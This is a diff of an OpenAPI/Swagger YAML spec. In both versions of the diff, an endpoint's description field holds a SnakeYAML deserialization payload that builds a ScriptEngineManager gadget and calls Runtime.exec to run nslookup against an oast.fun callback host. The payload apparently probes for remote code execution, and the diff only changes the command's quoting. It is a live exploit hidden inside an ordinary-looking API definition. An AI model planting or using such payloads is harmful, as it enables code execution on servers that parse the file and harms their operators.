@@ -11,7 +11,7 @@ paths:
     get:
       operationId: getVersions-v2
       summary: List versions
-      description: !!javax.script.ScriptEngineManager [!!java.lang.Runtime [[!!java.lang.Runtime.getRuntime.exec [nslookup cngg4t32vtc0000kmgv0gkaenpyyyyyyb.oast.fun]]]]
+      description: !!javax.script.ScriptEngineManager [!!java.lang.Runtime [[!!java.lang.Runtime.getRuntime.exec ["nslookup cngg4t32vtc0000kmgv0gkaenpyyyyyyb.oast.fun"]]]]
       produces:
       - application/json
       responses:
